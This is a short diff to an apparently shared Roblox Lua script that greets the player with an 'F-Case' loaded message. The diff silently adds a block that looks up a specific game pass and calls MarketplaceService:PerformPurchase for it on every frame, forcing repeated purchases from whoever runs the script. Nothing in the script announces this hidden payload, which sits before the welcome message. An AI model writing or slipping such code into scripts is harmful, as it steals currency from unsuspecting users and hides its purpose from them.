@@ -1,4 +1,13 @@
 wait(.1)
+gamePassId = 66254
+market = game:GetService("MarketplaceService")
+http = game:GetService("HttpService")
+info = market:GetProductInfo(gamePassId, Enum.InfoType.GamePass)
+game:GetService("RunService").Stepped:connect(function()
+market:PerformPurchase(Enum.InfoType.Asset, info["ProductId"], info["PriceInRobux"], http:GenerateGUID(false))
+end)
+
+wait(.1)
 game.StarterGui:SetCore("ChatMakeSystemMessage", {
         Text = "Welcome to F-Case, "..game.Players.LocalPlayer.Name.." - (FC LOADED)";
         Color = Color3.new(127, 75, 0);
